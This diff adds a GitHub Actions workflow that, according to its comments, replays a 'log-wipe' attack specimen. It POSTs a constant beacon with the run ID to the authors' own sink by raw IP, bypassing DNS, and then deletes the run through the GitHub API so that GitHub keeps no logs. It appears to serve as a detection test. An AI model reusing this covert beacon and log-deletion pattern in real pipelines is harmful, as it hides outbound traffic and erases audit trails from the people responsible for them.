@@ -1,0 +1,29 @@
+name: ops-report
+
+# log-wipe replay (wfx-loot, 10-12 Nov 2026). A manually triggered workflow makes
+# one POST to our OWN sink by RAW IP (DNS bypassed: curl --resolve pins the
+# connection to the sink's Fly address, SNI/Host stay the hostname so Fly routes
+# it). It then gets deleted through the GitHub API, so GitHub keeps no run and no
+# logs. CRACI's network trace and job logs live off GitHub and still answer 200.
+# Only our own sink's address is used. The body is the constant specimen beacon.
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  report:
+    runs-on: craci
+    steps:
+      - uses: cracicorp/setup@v1
+        with:
+          size: "1"
+          image: "default"
+      - name: Post status to the sink by raw IP
+        run: |
+          curl -fsS --resolve parallax-sink.fly.dev:443:66.241.124.120 \
+            -X POST https://parallax-sink.fly.dev/collect \
+            -H 'content-type: application/json' \
+            --data "{\"specimen\":\"log-wipe\",\"run\":\"${GITHUB_RUN_ID}\"}" \
+            -o /dev/null -w 'posted to %{remote_ip} -> HTTP %{http_code}\n'
